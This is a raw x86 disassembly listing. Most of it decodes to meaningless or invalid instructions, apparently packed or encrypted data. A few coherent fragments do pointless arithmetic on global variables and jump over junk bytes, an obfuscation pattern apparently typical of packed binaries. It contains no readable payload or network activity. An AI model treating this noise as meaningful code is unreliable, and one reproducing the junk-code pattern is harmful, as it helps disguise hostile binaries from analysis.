  4095bd:	jmp    0x2065:0x60bf5d90
  4095c4:	nop
  4095c5:	or     BYTE PTR [eax-0x1e278ea5],0x8b
  4095cc:	mov    BYTE PTR [edx],ch
  4095ce:	mov    edx,0xe9211980
  4095d3:	cmp    eax,0xaa2b1d36
  4095d8:	scas   eax,DWORD PTR es:[edi]
  4095d9:	sti    
  4095da:	sub    BYTE PTR [esi+0x3356c2c4],dl
  4095e0:	sti    
  4095e1:	jmp    0x230a53a3
  4095e6:	arpl   WORD PTR [ebp-0x76],dx
  4095e9:	or     ch,al
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e61:0x6c31594e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	cmp    cl,ah
  40960e:	cmp    BYTE PTR ds:0x4755dd85,0x9a
  409615:	not    DWORD PTR [ecx]
  409617:	inc    esp
  409618:	jns    0x409657
  40961a:	repnz mov ebx,DWORD PTR [edx+0x7d]
  40961e:	out    dx,eax
  40961f:	and    eax,0xd47957bb
  409624:	pop    edx
  409625:	iret   
  409626:	jo     0x409645
  409628:	cmp    bl,BYTE PTR [edi+0x17]
  40962b:	mov    edi,0x5863de80
  409630:	push   ebx
  409631:	(bad)
  409635:	sbb    DWORD PTR [eax+0x79],eax
  409638:	xor    ah,BYTE PTR [eax]
  40963a:	sbb    DWORD PTR [ebp+0x33],edi
  40963d:	and    BYTE PTR [ebp+ecx*2+0x900a3b1],cl
  409644:	(bad)  
  409645:	pop    esi
  409646:	push   cs
  409647:	inc    ebx
  409648:	fiadd  DWORD PTR [edi+0x26fbf820]
  40964e:	daa    
  40964f:	xchg   esi,eax
  409650:	and    ebp,DWORD PTR [edi-0x13]
  409653:	pop    ecx
  409654:	out    dx,eax
  409655:	push   eax
  409656:	and    eax,DWORD PTR [edx-0x6a]
  409659:	inc    ebx
  40965a:	jmp    0x6dadc50c
  40965f:	jne    0x4096c0
  409661:	pushf  
  409662:	(bad)  
  409664:	sub    eax,DWORD PTR [esi]
  409666:	xchg   ebx,eax
  409667:	push   cs
  409668:	pusha  
  409669:	dec    esi
  40966a:	sub    cl,BYTE PTR [ecx]
  40966c:	int    0xc2
  40966e:	mov    esi,0x2474171
  409673:	inc    ebp
  409674:	inc    ebx
  409675:	popa   
  409676:	sbb    esp,DWORD PTR [ebp+0x5587fa2b]
  40967c:	dec    ebp
  40967d:	stc    
  40967e:	pop    ebp
  40967f:	fld    TBYTE PTR [edi]
  409681:	fwait
  409682:	cmp    eax,0x1135ee6d
  409687:	in     al,0x9b
  409689:	pusha  
  40968a:	(bad)  
  40968b:	sbb    al,BYTE PTR ds:0x78def54c
  409691:	call   0x876728f5
  409696:	es push es
  409698:	sbb    eax,0x39d45c09
  40969d:	in     eax,0x39
  40969f:	add    DWORD PTR [esi+0x26],ebp
  4096a2:	jecxz  0x4096d4
  4096a4:	imul   edx,edx,0x5e
  4096a7:	ins    BYTE PTR es:[edi],dx
  4096a8:	(bad)  
  4096a9:	xor    al,al
  4096ab:	xchg   esp,eax
  4096ac:	sti    
  4096ad:	test   BYTE PTR [eax-0x27],0xd2
  4096b1:	not    DWORD PTR [edi+eax*8]
  4096b4:	mov    esi,0xf611d1ee
  4096b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ba:	pop    ecx
  4096bb:	cmp    DWORD PTR [edi+0x5a02505f],esp
  4096c1:	fnstcw WORD PTR [ebx-0x770e5bc2]
  4096c7:	xchg   ecx,eax
  4096c8:	out    0x6f,al
  4096ca:	pop    edi
  4096cb:	xchg   DWORD PTR [eax-0xeb2c935],edx
  4096d1:	mov    al,0xdb
  4096d3:	adc    BYTE PTR [edx],0xe4
  4096d6:	lea    ecx,[eax]
  4096d8:	jp     0x4096b0
  4096da:	leave  
  4096db:	daa    
  4096dc:	out    dx,al
  4096dd:	push   cs
  4096de:	jle    0xfcc04384
  4096e4:	jo     0x409761
  4096e6:	sub    al,0x93
  4096e8:	cmp    esp,DWORD PTR [edi+eiz*8+0x6d]
  4096ec:	scas   al,BYTE PTR es:[edi]
  4096ed:	mov    esp,0xd2633f94
  4096f2:	inc    ebp
  4096f3:	add    esp,DWORD PTR [esi*4-0x2e1446f9]
  4096fa:	test   eax,0x77303444
  4096ff:	in     al,0x0
  409701:	jbe    0x4096e0
  409703:	not    DWORD PTR [ebx-0x50]
  409706:	jnp    0x40976c
  409708:	pop    es
  409709:	je     0x40974b
  40970b:	pop    ds
  40970c:	es mov bl,0xe1
  40970f:	ror    eax,0xcd
  409712:	rcr    ah,1
  409714:	sub    eax,0x54f26a7
  409719:	test   BYTE PTR [ebp-0x61],dl
  40971c:	pop    edx
  40971d:	data16 js 0x409712
  409720:	loop   0x40974a
  409722:	xchg   esp,eax
  409723:	arpl   WORD PTR ds:0xf753e346,cx
  409729:	push   ebx
  40972a:	push   es
  40972b:	sub    eax,0x2c4d5d62
  409730:	test   ecx,ebx
  409732:	imul   BYTE PTR [edx]
  409734:	sbb    eax,0xcc39bd36
  409739:	sbb    DWORD PTR [ebx-0x3bc3566b],edi
  40973f:	or     dh,bl
  409741:	push   esi
  409742:	mov    edx,0x4a01645b
  409747:	aas    
  409748:	xchg   esi,eax
  409749:	(bad)  
  40974a:	or     al,0x15
  40974c:	stos   DWORD PTR es:[edi],eax
  40974d:	lods   eax,DWORD PTR ds:[esi]
  40974e:	mov    edx,0xb45f23df
  409753:	sbb    DWORD PTR [esi-0x2],0xffffffe9
  409757:	cli    
  409758:	jno    0x4097d7
  40975a:	mov    ah,0xa1
  40975c:	and    ecx,edx
  40975e:	add    al,0x27
  409760:	sub    dh,BYTE PTR [eax-0x3afc2b43]
  409766:	mov    dl,0xcf
  409768:	jecxz  0x409751
  40976a:	xchg   ebx,eax
  40976b:	dec    ebp
  40976c:	sbb    edx,DWORD PTR [ebx]
  40976e:	ficom  WORD PTR [edx+0x4c]
  409771:	push   0x74
  409773:	cmp    edi,DWORD PTR [esi+0x40]
  409776:	sbb    dl,dl
  409778:	pop    ss
  409779:	pop    eax
  40977a:	jnp    0x4096ff
  40977c:	and    eax,0x2cfa00e0
  409781:	out    dx,al
  409782:	jmp    0xdfe4d619
  409787:	or     DWORD PTR [ebx+0x21f235bf],esp
  40978d:	ret    
  40978e:	stos   DWORD PTR es:[edi],eax
  40978f:	mov    cl,ch
  409791:	add    al,0x3b
  409793:	cdq    
  409794:	out    dx,eax
  409795:	xchg   esi,eax
  409796:	rol    al,0xff
  409799:	fbld   TBYTE PTR [esi]
  40979b:	adc    al,0x7
  40979d:	mov    ebp,0xf184fd45
  4097a2:	mov    ebx,edi
  4097a4:	push   0xffffffe9
  4097a6:	dec    esi
  4097a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a8:	stos   BYTE PTR es:[edi],al
  4097a9:	sbb    eax,0x5b2663b6
  4097ae:	es jnp 0x409806
  4097b1:	js     0x4097b3
  4097b3:	pop    esi
  4097b4:	jg     0x4097d8
  4097b6:	loope  0x409819
  4097b8:	mov    eax,ds:0x830ddfa1
  4097bd:	div    DWORD PTR [ebx]
  4097bf:	das    
  4097c0:	mov    ecx,edi
  4097c2:	mov    eax,ds:0xdfb1cc4
  4097c7:	iret   
  4097c8:	std    
  4097c9:	ja     0x40977b
  4097cb:	sti    
  4097cc:	adc    esp,edx
  4097ce:	pop    es
  4097cf:	shl    DWORD PTR [esi],cl
  4097d1:	pop    edx
  4097d2:	rcl    DWORD PTR [ebx-0x30425188],cl
  4097d8:	(bad)  
  4097d9:	std    
  4097da:	pop    ecx
  4097db:	mov    dl,dl
  4097dd:	jae    0x4097c8
  4097df:	pop    ebx
  4097e0:	inc    edi
  4097e1:	mov    ebx,0x463caa12
  4097e6:	jecxz  0x40984a
  4097e8:	fstp   TBYTE PTR [ecx+0x5bb9522f]
  4097ee:	nop
  4097ef:	and    DWORD PTR [esi+0x72],ebx
  4097f2:	sbb    edi,ebp
  4097f4:	adc    al,al
  4097f6:	sar    al,1
  4097f8:	mov    edx,0xcde6262
  4097fd:	stc    
  4097fe:	repz test dh,cl
  409801:	mov    ecx,0x31f4d0ad
  409806:	jo     0x40978c
  409808:	ja     0x409835
  40980a:	inc    ecx
  40980c:	imul   ecx,eax,0xffffffd7
  40980f:	lahf   
  409810:	cld    
  409811:	bound  eax,QWORD PTR [edx+eax*2]
  409814:	or     al,0xfe
  409816:	(bad)  
  409817:	xor    DWORD PTR [edi+0x76],esi
  40981a:	pop    eax
  40981b:	mov    ecx,0xd2ad3a27
  409820:	sbb    DWORD PTR [edi*8-0x51df724b],ebx
  409827:	shl    BYTE PTR [edi+0x5d4b90d9],cl
  40982d:	das    
  40982e:	ret    0x612a
  409831:	xchg   ebp,eax
  409832:	dec    esi
  409833:	sbb    ch,ch
  409835:	popa   
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	retf   0x55dd
  4098c3:	or     BYTE PTR [ecx+ebx*8+0x7c387e7e],dh
  4098ca:	jle    0x40994a
  4098cc:	adc    DWORD PTR [ebx],edx
  4098ce:	xchg   BYTE PTR [edi+0x38b49335],dl
  4098d4:	xchg   edi,eax
  4098d5:	in     eax,dx
  4098d6:	xlat   BYTE PTR ds:[ebx]
  4098d7:	into   
  4098d8:	out    0x1a,al
  4098da:	jmp    0x4098d8
  4098dc:	stc    
  4098dd:	popf   
  4098de:	cmp    esp,edi
  4098e0:	mov    ah,0xa7
  4098e2:	xor    al,BYTE PTR [esi]
  4098e4:	inc    edi
  4098e5:	lock adc edi,DWORD PTR [ebp*2+0x4cc4288d]
  4098ed:	jmp    0x25f1:0xe05e361
  4098f4:	or     DWORD PTR [ebx-0x4458062c],0xe0c90101
  4098fe:	jge    0x409972
  409900:	repnz out dx,al
  409902:	mov    DWORD PTR [edi],ecx
  409904:	fisub  WORD PTR ds:0x2175bd58
  40990a:	push   es
  40990b:	es lahf 
  40990d:	ret    
  40990e:	mov    ds:0x804a6e17,al
  409913:	std    
  409914:	add    dh,BYTE PTR [eax+0x70]
  409917:	pop    esp
  409918:	or     BYTE PTR [edi+0x27a462d7],dl
  40991e:	mov    edx,ss
  409920:	sar    DWORD PTR [eax+0x26],1
  409923:	call   0x6868:0x761fb1bb
  40992a:	test   BYTE PTR [edx-0x55],0xb4
  40992e:	ds pop eax
  409930:	daa    
  409931:	hlt    
  409932:	xchg   ebp,eax
  409933:	push   es
  409934:	sub    eax,0x8aad2981
  409939:	jmp    0xe3e96d78
  40993e:	enter  0x2f55,0x7f
  409942:	jp     0x409990
  409944:	loopne 0x40999c
  409946:	leave  
  409947:	xor    DWORD PTR [ecx+0x52508d8b],ebx
  40994d:	xor    ah,BYTE PTR [ebp+0x6b9e4aaa]
  409953:	jle    0x409941
  409955:	ds add cl,ch
  409958:	or     eax,0xf4861f14
  40995d:	xchg   BYTE PTR ds:0x7a39db78,ah
  409963:	inc    ebp
  409964:	mov    bh,0x15
  409966:	xchg   ecx,eax
  409967:	pop    ebx
  409968:	xchg   esi,eax
  409969:	sub    BYTE PTR [ebx-0x6d],bl
  40996c:	push   ebx
  40996d:	loope  0x409931
  40996f:	sti    
  409970:	out    0xb2,al
  409972:	xchg   esi,eax
  409973:	mov    ah,0xa7
  409975:	xchg   DWORD PTR [ecx+0x4bed8c0],edi
  40997b:	outs   dx,DWORD PTR ds:[esi]
  40997c:	std    
  40997d:	or     esi,DWORD PTR [edx+0x5f08d822]
  409983:	pop    eax
  409984:	and    DWORD PTR [edi*4+0x32f56e56],ecx
  40998b:	cs jnp 0x40993d
  40998e:	lea    ebx,[edx-0x41]
  409991:	aaa    
  409992:	outs   dx,BYTE PTR ds:[esi]
  409993:	add    DWORD PTR [ebp+0x19],esp
  409996:	xchg   esp,eax
  409997:	sbb    BYTE PTR [ecx],bh
  409999:	jb     0x4099a8
  40999b:	jge    0x4099b4
  40999d:	cld    
  40999e:	pop    esp
  40999f:	aaa    
  4099a0:	retf   0xdb7a
  4099a3:	sub    al,0x2f
  4099a5:	or     DWORD PTR [ebx+ecx*1+0x24],ecx
  4099a9:	adc    eax,0xcfd0e2eb
  4099ae:	data16 sub al,0x9
  4099b1:	test   eax,edx
  4099b3:	xchg   esi,eax
  4099b4:	lds    ecx,FWORD PTR [eax-0x10]
  4099b7:	enter  0x1764,0x1b
  4099bb:	jecxz  0x4099dd
  4099bd:	push   edx
  4099be:	dec    ebx
  4099bf:	or     al,0x63
  4099c1:	mov    dh,0x85
  4099c3:	jns    0x4099fb
  4099c5:	mov    dh,0xa0
  4099c7:	or     al,0xab
  4099c9:	pop    esi
  4099ca:	adc    ebp,DWORD PTR [ebx-0x72a64144]
  4099d0:	dec    esp
  4099d1:	and    bl,dh
  4099d3:	sub    BYTE PTR [edx+0x437770fe],0xba
  4099da:	shl    BYTE PTR [edx-0x67c4cdf6],0xaa
  4099e1:	in     al,0x97
  4099e3:	sub    ah,dh
  4099e5:	inc    edi
  4099e6:	call   0x7b29:0x94112d0b
  4099ed:	cmp    eax,0xd0ac2e29
  4099f2:	pop    edx
  4099f3:	mov    al,0xc
  4099f5:	stos   DWORD PTR es:[edi],eax
  4099f6:	hlt    
  4099f7:	add    esp,eax
  4099f9:	cmp    DWORD PTR [edx-0x4ed2cc54],0x20
  409a00:	ret    
  409a01:	cvtps2pi mm1,QWORD PTR [ebp-0x5a880acc]
  409a08:	les    edi,FWORD PTR [edi]
  409a0a:	dec    esi
  409a0b:	mov    ebx,0x33ce6a68
  409a10:	xchg   ebx,eax
  409a11:	imul   BYTE PTR [ebx]
  409a13:	(bad)  
  409a14:	shl    DWORD PTR [edi],cl
  409a16:	mov    ch,0x51
  409a18:	push   eax
  409a19:	icebp  
  409a1a:	sbb    BYTE PTR [edx+0x37],bh
  409a1d:	adc    ebx,DWORD PTR [ebx+0x6f963739]
  409a23:	push   es
  409a24:	outs   dx,BYTE PTR ds:[esi]
  409a25:	cmp    ah,BYTE PTR [edx+0x69]
  409a28:	adc    al,0x7
  409a2a:	iret   
  409a2b:	fnstsw WORD PTR [esp+eax*8-0x42]
  409a2f:	mov    ah,0x58
  409a31:	sbb    dl,BYTE PTR [edx-0x32b03ebc]
  409a37:	shr    BYTE PTR [esi+0x34da653a],cl
  409a3d:	push   es
  409a3e:	mov    dh,0xc5
  409a40:	call   0xe495:0x66b75ac7
  409a47:	je     0x4099f5
  409a49:	in     eax,0x6c
  409a4b:	arpl   WORD PTR [ebp-0x5a39a539],si
  409a51:	sub    DWORD PTR [ebx+0x72],ecx
  409a54:	push   edi
  409a55:	dec    esp
  409a56:	imul   edi,edi,0x2
  409a59:	retf   0xd08a
  409a5c:	cmc    
  409a5d:	push   0x6f580fd0
  409a62:	push   ds
  409a63:	pop    ds
  409a64:	mov    ebp,0xab79bca2
  409a69:	lods   al,BYTE PTR ds:[esi]
  409a6a:	stos   DWORD PTR es:[edi],eax
  409a6b:	xor    al,0x6d
  409a6d:	cmc    
  409a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a6f:	adc    ch,BYTE PTR [edx+0x7c]
  409a72:	mov    eax,ds:0x933cd411
  409a77:	jle    0x409ac6
  409a79:	add    al,0x84
  409a7b:	jns    0x4099fd
  409a7d:	jb     0x409a6c
  409a7f:	push   esi
  409a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a81:	sub    eax,0xaf5371a1
  409a86:	pop    esp
  409a87:	pushf  
  409a88:	jnp    0x409a4b
  409a8a:	test   eax,0x8ad94629
  409a8f:	stos   DWORD PTR es:[edi],eax
  409a90:	cmp    bl,BYTE PTR [edx+0x11eea3c4]
  409a96:	xchg   DWORD PTR [esi],eax
  409a98:	pop    edx
  409a99:	or     ebx,esp
  409a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a9c:	out    dx,eax
  409a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a9e:	xor    al,0x74
  409aa0:	iret   
  409aa1:	mov    ds:0xf6faf068,eax
  409aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aa7:	cmp    al,0x26
  409aa9:	shl    BYTE PTR [edx],cl
  409aab:	dec    edx
  409aac:	or     al,0x8e
  409aae:	sub    eax,DWORD PTR [esp+ebp*2]
  409ab1:	pop    edx
  409ab2:	xchg   DWORD PTR [eax+esi*2+0x6a9c9bde],ebp
  409ab9:	repz pop ds
  409abb:	ins    BYTE PTR es:[edi],dx
  409abc:	int    0x4c
  409abe:	adc    dl,BYTE PTR ds:0x3532c55a
  409ac4:	dec    ecx
  409ac5:	fwait
  409ac6:	pop    esp
  409ac7:	push   esi
  409ac8:	pop    eax
  409ac9:	pop    ds
  409aca:	push   esi
  409acb:	ret    
  409acc:	fwait
  409acd:	shl    DWORD PTR [ecx+edx*4+0x3f],cl
  409ad1:	fnstcw WORD PTR [edx+edi*4+0x378662d1]
  409ad8:	jle    0x409aed
  409ada:	xchg   edx,eax
  409adb:	sbb    eax,0x1a143d10
  409ae0:	cmp    eax,0x5975aa44
  409ae5:	mov    bh,0xad
  409ae7:	and    ah,BYTE PTR [ebp+0x76593558]
  409aed:	cmp    DWORD PTR [edi],esp
  409aef:	mov    bh,BYTE PTR [edi+0x79]
  409af2:	jg     0x409a88
  409af4:	and    al,0xcc
  409af6:	retf   0xafa7
  409af9:	popf   
  409afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409afb:	xor    al,0xf8
  409afd:	xor    dl,BYTE PTR [edx+0x5c]
  409b00:	addr16 inc edx
  409b02:	outs   dx,DWORD PTR ds:[esi]
  409b03:	nop
  409b04:	(bad)  
  409b05:	push   eax
  409b06:	mov    eax,ds:0x43364312
  409b0b:	mov    ch,0x4d
  409b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b0e:	adc    BYTE PTR ds:0x57563785,dh
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x65820c2c]
  409b32:	jge    0x409bb2
  409b34:	in     al,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409ad4
  409b3c:	hlt    
  409b3d:	repz jp 0x409b76
  409b40:	add    ebx,DWORD PTR cs:[ebp+0x2bfecd4d]
  409b47:	jae    0x409af8
  409b49:	adc    BYTE PTR [edi+ebp*1],dl
  409b4c:	ja     0x409afe
  409b4e:	mov    bl,0x2e
  409b50:	xor    ch,BYTE PTR [ecx]
  409b52:	nop
  409b53:	bound  ecx,QWORD PTR [ebp-0x7388a3b7]
  409b59:	out    0xb8,eax
  409b5b:	icebp  
  409b5c:	bound  ecx,QWORD PTR ds:0x474bab0c
  409b62:	or     edx,esp
  409b64:	call   DWORD PTR [ecx+0x46]
  409b67:	outs   dx,BYTE PTR ds:[esi]
  409b68:	fnstsw WORD PTR ss:[eax]
  409b6b:	jge    0x409bcf
  409b6d:	inc    eax
  409b6e:	cmp    al,BYTE PTR [esi-0x80]
  409b71:	retf   
  409b72:	cmp    al,BYTE PTR [ebp+0x6ef75bd1]
  409b78:	sar    BYTE PTR [edx+edi*2],0x72
  409b7c:	adc    ch,BYTE PTR [ecx+0x3]
  409b7f:	jmp    0x409bad
  409b81:	pop    esp
  409b82:	out    0x89,al
  409b84:	hlt    
  409b85:	xchg   ebx,eax
  409b86:	sbb    eax,0xf1222d00
  409b8b:	pop    ebp
  409b8c:	test   al,0x81
  409b8e:	stos   DWORD PTR es:[edi],eax
  409b8f:	ret    
  409b90:	popa   
  409b91:	mov    ds:0xda424746,eax
  409b96:	dec    edx
  409b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b98:	pop    ecx
  409b99:	test   al,0x6b
  409b9b:	cld    
  409b9c:	sub    eax,0x49c25f26
  409ba1:	jns    0x409b9e
  409ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba4:	aad    0x57
  409ba6:	sti    
  409ba7:	add    BYTE PTR [esi],dl
  409ba9:	lock inc esp
  409bab:	fsubr  QWORD PTR ds:0x87e81b26
  409bb1:	sbb    al,0xbd
  409bb3:	out    dx,al
  409bb4:	mov    eax,edi
  409bb6:	test   al,0xcb
  409bb8:	nop
  409bb9:	push   0x49
  409bbb:	outs   dx,DWORD PTR ds:[esi]
  409bbc:	cmp    DWORD PTR [ebp+0x55],0x2c
  409bc0:	jne    0x409b7c
  409bc2:	(bad)  
  409bc3:	dec    edi
  409bc4:	jle    0x409c00
  409bc6:	pop    edx
  409bc7:	fcomp  DWORD PTR [ebx]
  409bc9:	mov    dl,0x68
  409bcb:	push   cs
  409bcc:	jb     0x409b94
  409bce:	call   0xa7e9fb11
  409bd3:	push   0xdcbaa09
  409bd8:	cwde   
  409bd9:	gs cwde 
  409bdb:	sbb    dh,dl
  409bdd:	xor    al,bh
  409bdf:	xchg   DWORD PTR [esi-0x16dd08f4],ebp
  409be5:	and    esp,DWORD PTR [edi-0x1a2c47a8]
  409beb:	dec    esi
  409bec:	rol    eax,0x4b
  409bef:	cmp    eax,0xe9696ccb
  409bf4:	jmp    0x2bd87cc7
  409bf9:	cld    
  409bfa:	sbb    eax,0xc4971376
  409bff:	stos   BYTE PTR es:[edi],al
  409c00:	xor    al,0xd8
  409c02:	pop    eax
  409c03:	push   edi
  409c04:	sbb    al,0x4d
  409c07:	sbb    BYTE PTR [edx-0x5b3d9158],bh
  409c0d:	pop    esi
  409c0e:	leave  
  409c0f:	ret    
  409c10:	push   0xc7ff8b6b
  409c15:	pop    ebx
  409c16:	or     eax,0x28ab19c7
  409c1b:	stos   BYTE PTR es:[edi],al
  409c1c:	dec    ebp
  409c1d:	jbe    0x409bd6
  409c1f:	loopne 0x409ba5
  409c21:	xor    BYTE PTR [edx-0x70952bd5],bh
  409c27:	xor    ecx,esp
  409c29:	or     BYTE PTR [ecx-0x346e1b3b],bl
  409c2f:	loopne 0x409c03
  409c31:	adc    ch,ah
  409c33:	pop    ss
  409c34:	aam    0xdb
  409c36:	and    al,0xd8
  409c38:	test   BYTE PTR [edx],al
  409c3a:	lds    ecx,FWORD PTR [eax+ebx*8]
  409c3d:	jbe    0x409c3d
  409c3f:	in     al,0x76
  409c41:	and    DWORD PTR [ebp-0x34],esp
  409c44:	mov    bl,0x4a
  409c46:	xchg   edi,eax
  409c47:	mov    edx,0xbc18847f
  409c4c:	out    dx,al
  409c4d:	dec    edx
  409c4e:	sbb    al,0x58
  409c50:	push   ds
  409c51:	xor    edx,DWORD PTR [eax]
  409c53:	dec    esi
  409c54:	nop
  409c55:	aad    0x2
  409c57:	ss cmc 
  409c59:	in     eax,dx
  409c5a:	andps  xmm4,xmm7
  409c5d:	(bad)  
  409c5e:	push   DWORD PTR [edi+edx*4+0x7e8f07e7]
  409c65:	ret    0x2654
  409c68:	xor    BYTE PTR [esi-0x27583281],al
  409c6e:	sbb    DWORD PTR [ecx],eax
  409c70:	jo     0x409c41
  409c72:	les    edx,FWORD PTR [edx+0x1f]
  409c75:	mov    ds:0x72c7ae3e,eax
  409c7a:	lods   eax,DWORD PTR ds:[esi]
  409c7b:	icebp  
  409c7c:	xchg   ecx,eax
  409c7d:	(bad)  
  409c7e:	mov    ecx,0x5008c9c4
  409c83:	fimul  DWORD PTR [ebp+0x65237f76]
  409c89:	fwait
  409c8a:	pop    edi
  409c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c8c:	je     0x409c18
  409c8e:	fucom  st(0)
  409c90:	fist   DWORD PTR [edx]
  409c92:	out    0x50,eax
  409c94:	cmp    dh,BYTE PTR [ebx-0x77]
  409c97:	es imul esi,ebp,0x23ea438d
  409c9e:	mov    BYTE PTR [ebx-0x26],dh
  409ca1:	test   BYTE PTR [esi],bl
  409ca3:	push   eax
  409ca4:	pop    edi
  409ca5:	fbld   TBYTE PTR [ebx+0x8]
  409ca8:	dec    ebp
  409ca9:	xor    DWORD PTR ds:0x3e6fde7e,ebp
  409caf:	mov    eax,ds:0xd84c4302
  409cb4:	aaa    
  409cb5:	iret   
  409cb6:	add    DWORD PTR [edi+edi*2+0x50],ebx
  409cba:	adc    BYTE PTR [ecx+0x2b9b8966],ch
  409cc0:	inc    esi
  409cc1:	push   ss
  409cc2:	jg     0x409ceb
  409cc4:	jp     0x409ca2
  409cc6:	push   0x7ce4cf0a
  409ccb:	data16 (bad) 
  409ccd:	mov    eax,ds:0x494a7e41
  409cd2:	jne    0x409c6e
  409cd4:	loopne 0x409cbc
  409cd6:	add    ah,bh
  409cd8:	sub    eax,0x10ed02f8
  409cdd:	sbb    eax,DWORD PTR [ebx]
  409cdf:	popa   
  409ce0:	mov    bh,0xeb
  409ce2:	adc    ebp,DWORD PTR [edx-0x21]
  409ce5:	outs   dx,BYTE PTR ds:[esi]
  409ce6:	jg     0x409c78
  409ce8:	mov    eax,0x701b219
  409ced:	lock jbe 0x409cfe
  409cf0:	inc    ebp
  409cf1:	call   0x91f763fd
  409cf6:	mov    esp,0x452540d7
  409cfb:	mov    bl,0xc4
  409cfd:	pop    ss
  409cfe:	xchg   edx,esi
  409d00:	add    ch,BYTE PTR [ecx+0x66]
  409d03:	push   eax
  409d04:	popf   
  409d05:	mov    ah,0xb0
  409d07:	hlt    
  409d08:	and    ebx,DWORD PTR [edi+edx*2]
  409d0b:	mov    ds:0xefc7f134,eax
  409d10:	inc    esi
  409d11:	dec    ecx
  409d12:	xchg   esi,eax
  409d13:	push   es
  409d14:	das    
  409d15:	repnz fdivrp st(6),st
  409d18:	sahf   
  409d19:	sbb    BYTE PTR [edx-0x21],ch
  409d1c:	push   0x621e2752
  409d21:	jge    0x409d1e
  409d23:	in     eax,0x83
  409d25:	aaa    
  409d26:	or     edi,edi
  409d28:	push   0xffffffcd
  409d2a:	or     edx,DWORD PTR [esp+ebx*4]
  409d2d:	xor    BYTE PTR [eax],ah
  409d2f:	jg     0x409d41
  409d31:	mov    eax,DWORD PTR [ecx]
  409d33:	push   0x3cadd110
  409d38:	aad    0x3b
  409d3a:	sub    esi,ecx
  409d3c:	popa   
  409d3d:	shl    BYTE PTR [ecx-0x15],0x49
  409d41:	leave  
  409d42:	cwde   
  409d43:	adc    eax,0xcf84c5ba
  409d48:	hlt    
  409d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4a:	sbb    esp,DWORD PTR [ebp+eiz*1-0x12f86b94]
  409d51:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  409d53:	mov    BYTE PTR fs:[ebx+0x41],dl
  409d57:	out    dx,eax
  409d58:	cmp    eax,0xff0c1539
  409d5d:	in     eax,dx
  409d5e:	int3   
  409d5f:	iret   
  409d60:	repnz and esp,esp
  409d63:	sbb    DWORD PTR [ecx],0xfffffff0
  409d66:	cmp    eax,0xc47c56d7
  409d6b:	push   ecx
  409d6c:	pop    eax
  409d6d:	push   edx
  409d6e:	inc    ebp
  409d6f:	push   eax
  409d70:	jne    0x409d32
  409d72:	sbb    al,0x46
  409d74:	pushf  
  409d75:	int3   
  409d76:	stos   DWORD PTR es:[edi],eax
  409d77:	repnz pop ebx
  409d79:	xchg   BYTE PTR [ecx+0x2cd16abc],ch
  409d7f:	jmp    0x409d01
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
